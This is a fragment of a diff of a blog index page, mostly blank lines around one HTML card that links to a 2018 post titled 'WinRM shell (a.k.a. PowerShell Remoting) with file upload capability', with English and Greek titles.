-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
